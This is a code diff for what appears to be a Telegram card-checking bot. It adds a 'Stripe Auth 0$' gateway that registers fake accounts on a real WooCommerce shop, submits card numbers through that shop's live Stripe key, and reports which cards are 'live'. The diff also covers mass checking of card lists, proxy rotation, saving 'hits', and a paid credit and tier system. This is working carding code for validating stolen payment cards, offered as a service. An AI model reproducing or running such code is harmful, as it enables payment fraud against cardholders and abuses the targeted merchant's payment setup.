+        '/mchk0': 'stripe_auth0',
+        '/chk0': 'stripe_auth0',
     }
     
     
@@ -48101,6 +48021,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(ezycourse_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'dabbagh_stripe':
         asyncio.create_task(dabbagh_mass_check_logic(update, context, cards, progress_msg))
+    elif gateway == 'stripe_auth0':
+        asyncio.create_task(mass_check_stripe_auth0_logic(update, context, cards, progress_msg))
     else:
         await update.message.reply_text(f"❌ Gateway {gateway} not implemented yet.")
     
@@ -49111,14 +49033,7 @@ async def single_check_paypal_with_pool(update: Update, context: ContextTypes.DE
         
         user_manager.increment_checks(u_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(u_id) == 'free':
-            remaining = get_user_credits(u_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -49288,15 +49203,7 @@ async def single_check_paypal_with_gif(update: Update, context: ContextTypes.DEF
         
         user_manager.increment_checks(u_id)
         
-        # Show remaining credits for free users
-        tier_check = user_manager.get_tier(u_id)
-        if tier_check == 'free':
-            remaining = get_user_credits(u_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -50543,9 +50450,1145 @@ async def pre_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Then in main(), add this BEFORE all other handlers:
 # ============ CREDIT SYSTEM COMMANDS ============
 
+# ============ STRIPE AUTH 0$ GATEWAY (FROM Stripe 0$.py) ============
+# Add this to your f13.py
+
+import requests
+import re
+import random
+import string
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor
+import asyncio
+import traceback
+from typing import Dict, Tuple, Optional, List
+from datetime import datetime
+
+# Active tasks for Stripe Auth 0$
+stripe_auth0_active_tasks = {}
+
+# ============ STRIPE AUTH 0$ CONFIG ============
+STRIPE_AUTH0_BASE_URL = "https://shop.nemaneide.com"
+STRIPE_AUTH0_PK = "pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz"
+STRIPE_AUTH0_UA = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"
+
+# Helper functions
+def _rnd(k: int) -> str:
+    """Generate random hex string"""
+    return ''.join(random.choices(string.hexdigits.lower(), k=k))
+
+def _fn(html: str, key: str) -> Optional[str]:
+    """Find input value in HTML"""
+    match = re.search(rf'name="{key}"\s+value="([^"]+)"', html, re.I)
+    return match.group(1) if match else None
+
+def _jn(html: str, key: str) -> Optional[str]:
+    """Find JSON value in HTML"""
+    match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', html)
+    return match.group(1) if match else None
+
+def _icon(status: str) -> str:
+    """Get icon for status"""
+    if status == 'APPROVED':
+        return '✅'
+    elif status == 'DECLINED':
+        return '❌'
+    else:
+        return '⚠️'
+
+
+# ============ SYNCHRONOUS CHECK FUNCTION ============
+
+def check_card_stripe_auth0_sync(card: str) -> Tuple[str, str]:
+    """
+    Synchronous Stripe Auth 0$ check - runs in thread pool
+    Returns: (status, message)
+    """
+    try:
+        p = card.strip().split('|')
+        if len(p) != 4:
+            return "ERROR", "Invalid format (use: cc|mm|yy|cvv)"
+
+        cc, mm, yy, cvv = p
+        yy = yy[-2:] if len(yy) == 4 else yy
+        
+        s = requests.Session()
+        s.headers['user-agent'] = STRIPE_AUTH0_UA
+
+        # Step 1: Get registration nonce
+        r = s.get(f"{STRIPE_AUTH0_BASE_URL}/my-account/", timeout=30)
+        n = _fn(r.text, 'woocommerce-register-nonce')
+        if not n:
+            return "ERROR", "No register nonce found"
+
+        # Step 2: Register account
+        email = f"{''.join(random.choices(string.ascii_lowercase, k=6))}{_rnd(3)}@gmail.com"
+        password = _rnd(12)
+        
+        s.post(f"{STRIPE_AUTH0_BASE_URL}/my-account/",
+            headers={
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': STRIPE_AUTH0_BASE_URL,
+                'referer': f'{STRIPE_AUTH0_BASE_URL}/my-account/'
+            },
+            data={
+                'email': email,
+                'password': password,
+                'woocommerce-register-nonce': n,
+                '_wp_http_referer': '/my-account/',
+                'register': 'Registracija'
+            },
+            timeout=30
+        )
+        time.sleep(0.5)
+
+        # Step 3: Get payment methods page
+        r2 = s.get(f"{STRIPE_AUTH0_BASE_URL}/my-account/payment-methods/", 
+                   headers={'referer': f'{STRIPE_AUTH0_BASE_URL}/my-account/'}, 
+                   timeout=30)
+        an = _jn(r2.text, 'createAndConfirmSetupIntentNonce')
+        if not an:
+            return "ERROR", "No ajax nonce found"
+        time.sleep(0.3)
+
+        # Step 4: Create Stripe payment method
+        d = s.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers={
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/'
+            },
+            data={
+                'type': 'card',
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_year]': yy,
+                'card[exp_month]': mm.zfill(2),
+                'billing_details[address][country]': 'MO',
+                'key': STRIPE_AUTH0_PK,
+                '_stripe_version': '2024-06-20',
+                'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent',
+                'guid': _rnd(48),
+                'muid': _rnd(32),
+                'sid': _rnd(32),
+                'time_on_page': str(random.randint(5000, 15000))
+            },
+            timeout=30
+        ).json()
+
+        if 'error' in d:
+            return "DECLINED", d['error'].get('message', 'Declined')
+        if 'id' not in d:
+            return "ERROR", "Unexpected response from Stripe"
+        time.sleep(0.3)
+
+        # Step 5: Confirm setup intent
+        res = s.post(
+            f"{STRIPE_AUTH0_BASE_URL}/",
+            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
+            headers={
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': STRIPE_AUTH0_BASE_URL,
+                'referer': f'{STRIPE_AUTH0_BASE_URL}/my-account/add-payment-method/',
+                'x-requested-with': 'XMLHttpRequest'
+            },
+            data={
+                'action': 'create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': d['id'],
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': an
+            },
+            timeout=60
+        ).json()
+
+        if res.get('success'):
+            return "APPROVED", "Payment Method Added Successfully"
+
+        dt = res.get('data', {})
+        if isinstance(dt, dict):
+            if dt.get('status') == 'requires_action':
+                return "DECLINED", "Requires Action (3DS)"
+            e = dt.get('error', {})
+            if isinstance(e, dict):
+                # Check for specific error types
+                error_msg = e.get('message', 'Unknown')
+                error_code = e.get('code', '')
+                
+                # Card is LIVE but CVV wrong
+                if 'cvv' in error_msg.lower() or 'security' in error_msg.lower():
+                    return "APPROVED", f"CVV Live: {error_msg}"
+                # Insufficient funds
+                elif 'insufficient' in error_msg.lower() or 'funds' in error_msg.lower():
+                    return "APPROVED", f"Insufficient Funds: {error_msg}"
+                # Card declined
+                elif 'declined' in error_msg.lower():
+                    return "DECLINED", f"Card Declined: {error_msg}"
+                else:
+                    return "DECLINED", error_msg
+            return "DECLINED", str(dt)
+        
+        return "DECLINED", str(dt)
+
+    except requests.Timeout:
+        return "ERROR", "Request timeout"
+    except requests.ConnectionError:
+        return "ERROR", "Connection error"
+    except Exception as e:
+        return "ERROR", str(e)[:100]
+
+
+# ============ ASYNC WRAPPER ============
+
+async def check_card_stripe_auth0(card: str, proxy: str = None) -> Dict:
+    """
+    Check card using Stripe Auth 0$ gateway
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [STRIPE AUTH 0$] Checking card: {card[:20]}...")
+    print(f"{'='*80}")
+    
+    # Note: Proxy is not used in this gateway (it uses direct requests)
+    # The original script doesn't have proxy support
+    if proxy:
+        print(f"⚠️ [STRIPE AUTH 0$] Proxy support not available, using direct connection")
+    
+    start_time = time.time()
+    
+    try:
+        # Run the synchronous function in thread pool
+        loop = asyncio.get_event_loop()
+        status, message = await loop.run_in_executor(
+            thread_pool,
+            check_card_stripe_auth0_sync,
+            card
+        )
+        
+        elapsed = time.time() - start_time
+        
+        # Map status to our format
+        if status == "APPROVED":
+            # Check if it's CVV LIVE or Insufficient Funds
+            msg_lower = message.lower()
+            if "cvv" in msg_lower or "security" in msg_lower:
+                status_display = "✅ CVV LIVE"
+                status_category = "approved"
+            elif "insufficient" in msg_lower or "funds" in msg_lower:
+                status_display = "💰 INSUFFICIENT FUNDS"
+                status_category = "approved"
+            else:
+                status_display = "✅ APPROVED"
+                status_category = "approved"
+        elif status == "DECLINED":
+            status_display = "❌ DECLINED"
+            status_category = "declined"
+        else:
+            status_display = "⚠️ ERROR"
+            status_category = "error"
+        
+        return {
+            "status": "success" if status in ["APPROVED", "DECLINED"] else "error",
+            "result": status,
+            "message": message,
+            "status_display": status_display,
+            "status_category": status_category,
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "Stripe Auth 0$",
+            "proxy_used": proxy
+        }
+        
+    except Exception as e:
+        print(f"❌ [STRIPE AUTH 0$] Error: {e}")
+        return {
+            "status": "error",
+            "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": "$0.00",
+            "gateway": "Stripe Auth 0$"
+        }
+
+
+# ============ FORMAT RESPONSE ============
+
+def format_stripe_auth0_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Stripe Auth 0$ response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Stripe Auth 0$")
+    price = result.get("price", "$0.00")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:80]
+    if len(message) > 80:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    elif "DECLINED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        status_text = "ERROR"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    return ui, status_category
+
+
+# ============ SINGLE CHECK COMMAND ============
+
+@check_gateway("stripe_auth0")
+async def single_check_stripe_auth0(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Stripe Auth 0$ - /chk0 <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Stripe Auth 0$ Gateway</b>\n\n"
+            "Usage: <code>/chk0 &lt;card&gt;</code>\n"
+            "Example: <code>/chk0 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $0.00 (Free Auth Check)\n"
+            "📍 Gateway: Stripe via nemaneide.com\n"
+            "✅ Checks: CVV Live, Insufficient Funds, 3DS",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+    
+    # Check credits FIRST
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_auth0'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b>Stripe Auth 0$ not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+    
+    stripe_auth0_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        status_msg = await message.reply_text("🔄 Checking card with Stripe Auth 0$...")
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed (note: this gateway doesn't support proxy)
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            # The original script doesn't support proxy, but we'll try anyway
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [Stripe Auth 0$] Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_stripe_auth0(card, proxy_str)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_stripe_auth0_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Stripe Auth 0$",
+                response=result.get("message", "Approved"),
+                price="$0.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Stripe Auth 0$", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$0.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+        
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Stripe Auth 0$] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        stripe_auth0_active_tasks.pop(user_id, None)
+
+
+# ============ MASS CHECK COMMAND ============
+
+@check_gateway("stripe_auth0")
+async def mass_check_stripe_auth0(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Stripe Auth 0$ - /mchk0 <cards>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    # Check if user can mass check
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        credits = get_user_credits(user_id) if tier == 'free' else "∞"
+        
+        if tier == 'free' and credits <= 0:
+            error_msg = (
+                f"❌ <b>Insufficient Credits!</b>\n\n"
+                f"🎯 Your balance: <b>0</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💎 <b>Ways to get credits:</b>\n"
+                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
+                f"├─ Upgrade to Premium/Ultimate for unlimited\n"
+                f"└─ Contact @lencax\n\n"
+                f"📝 <b>Commands:</b>\n"
+                f"├─ /credits - Check balance\n"
+                f"├─ /redeemcredits - Add credits\n"
+                f"└─ /buy - Upgrade\n\n"
+                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
+        
+        elif tier == 'free' and credits > 0:
+            error_msg = (
+                f"❌ <b>Mass Check Not Available for FREE Tier</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📌 <b>FREE tier limitations:</b>\n"
+                f"   • Single checks only\n"
+                f"   • Use /chk0 for single card checks\n\n"
+                f"💎 <b>Upgrade to Premium/Ultimate for:</b>\n"
+                f"   • Mass checks\n"
+                f"   • All gateways\n"
+                f"   • Unlimited credits\n\n"
+                f"USE /buy TO UPGRADE YOUR TIER 💎"
+            )
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
+        
+        else:
+            error_msg = f"❌ Mass check not available for {tier.upper()} tier."
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_auth0'):
+        tier = user_manager.get_tier(user_id)
+        error_msg = (
+            f"❌ <b>Stripe Auth 0$ not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await mass_check_stripe_auth0_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Stripe Auth 0$ Mass Check</b>\n\n"
+            "Usage: <code>/mchk0 &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mchk0\n\n"
+            "Example: <code>/mchk0 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $0.00 (Free Auth Check)\n"
+            "📍 Gateway: Stripe via nemaneide.com\n"
+            "✅ Only approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await mass_check_stripe_auth0_logic(update, context, cards, None)
+
+
+# ============ MASS CHECK LOGIC ============
+
+async def mass_check_stripe_auth0_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Stripe Auth 0$ gateway"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [STRIPE AUTH 0$ MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    stats = {
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    
+    try:
+        stripe_auth0_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        # Concurrency based on tier
+        CONCURRENCY = {
+            "free": 2,
+            "premium": 5,
+            "ultimate": 10,
+            "admin": 10,
+        }.get(tier, 2)
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe Auth 0$\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Approved</b> ➛ 0 ✅\n"
+                f"<b>Declined</b> ➛ 0 ❌\n"
+                f"<b>Errors</b> ➛ 0 ⚠️\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 5 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe Auth 0$\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} ✅\n"
+                f"<b>Declined</b> ➛ {stats['declined']} ❌\n"
+                f"<b>Errors</b> ➛ {stats['errors']} ⚠️\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    print(f"⚠️ Progress update error: {e}")
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count
+            
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                
+                # Get proxy if allowed (gateway doesn't support proxy)
+                proxy_str = None
+                if user_manager.can_use_proxy(u_id):
+                    if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+                        proxy_list = autosopi_proxy_tracker.working_proxies[u_id]
+                        if proxy_list:
+                            proxy_index = idx % len(proxy_list)
+                            proxy_str = proxy_list[proxy_index]
+                
+                result = await check_card_stripe_auth0(card, proxy_str)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["errors"] += 1
+                        print(f"⚠️ [ERROR] {card[:20]}...")
+                    
+                    if processed_count % 5 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # ONLY SEND RESULT FOR APPROVED CARDS
+                if status_category == "approved":
+                    ui, _ = format_stripe_auth0_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except Exception as e:
+                        print(f"❌ Error sending result: {e}")
+                    
+                    await save_hit_to_file(
+                        card=card, gateway="Stripe Auth 0$",
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    user_data = user_manager.get_user(u_id)
+                    await send_hit_notification(
+                        context=context, gateway="Stripe Auth 0$", card=card,
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        user=user_data, bin_info=bin_info, status_category="approved"
+                    )
+                    user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process all cards
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+        
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in stripe_auth0_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+        
+        # Final summary
+        if u_id in stripe_auth0_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            summary = (
+                f"🏁 <b>Stripe Auth 0$ Mass Check Complete</b>\n\n"
+                f"✅ Approved: {stats['approved']}\n"
+                f"❌ Declined: {stats['declined']} (Hidden)\n"
+                f"⚠️ Errors: {stats['errors']}\n"
+                f"📝 Total: {total}\n"
+                f"⏱️ Time: {minutes}m {seconds}s"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ Stripe Auth 0$ mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        stripe_auth0_active_tasks.pop(u_id, None)
+        print(f"🏁 [Stripe Auth 0$ Mass] Session ended for user {u_id}")
+
 # Credit key storage
+# ============ CREDIT SYSTEM (FREE USERS ONLY) ============
+# Add this at the top with your other global variables
+
+CREDITS_FILE = "user_credits.json"
+INITIAL_FREE_CREDITS = 250  # New users get 250 free credits
+CREDITS_PER_SINGLE_CHECK = 1  # 1 credit = 1 single card check
+CREDITS_PER_MASS_CHECK = 1  # 1 credit per card in mass check
+
+# Store user credits
+user_credits = {}  # user_id -> credits remaining
+user_credits_loaded = False
+
+
+def load_user_credits():
+    """Load user credits from file"""
+    global user_credits, user_credits_loaded
+    if Path(CREDITS_FILE).exists():
+        try:
+            with open(CREDITS_FILE, 'r') as f:
+                user_credits = json.load(f)
+                # Convert string keys to int
+                user_credits = {int(k): v for k, v in user_credits.items()}
+            print(f"📊 Loaded credits for {len(user_credits)} users")
+        except Exception as e:
+            print(f"⚠️ Error loading credits: {e}")
+            user_credits = {}
+    else:
+        user_credits = {}
+    user_credits_loaded = True
+
+
+def save_user_credits():
+    """Save user credits to file"""
+    try:
+        with open(CREDITS_FILE, 'w') as f:
+            json.dump(user_credits, f, indent=2)
+    except Exception as e:
+        print(f"⚠️ Error saving credits: {e}")
+
+
+def get_user_credits(user_id: int) -> int:
+    """Get remaining credits for a user"""
+    if not user_credits_loaded:
+        load_user_credits()
+    return user_credits.get(user_id, 0)
+
+
+def add_user_credits(user_id: int, amount: int) -> int:
+    """Add credits to a user and return new total"""
+    current = get_user_credits(user_id)
+    new_total = current + amount
+    user_credits[user_id] = new_total
+    save_user_credits()
+    return new_total
+
+
+def deduct_user_credits(user_id: int, amount: int = CREDITS_PER_SINGLE_CHECK) -> bool:
+    """
+    Deduct credits for a check
+    Returns: True if successful, False if insufficient credits
+    """
+    current = get_user_credits(user_id)
+    if current >= amount:
+        user_credits[user_id] = current - amount
+        save_user_credits()
+        return True
+    return False
+
+
+def initialize_new_user_credits(user_id: int) -> int:
+    """Give initial free credits to new user (only for free tier)"""
+    # Only give credits if user doesn't have any credits yet
+    if user_id not in user_credits:
+        user_credits[user_id] = INITIAL_FREE_CREDITS
+        save_user_credits()
+        print(f"🎉 New free user {user_id} received {INITIAL_FREE_CREDITS} free credits!")
+        return INITIAL_FREE_CREDITS
+    return user_credits[user_id]
+
+
+def reset_user_credits(user_id: int) -> bool:
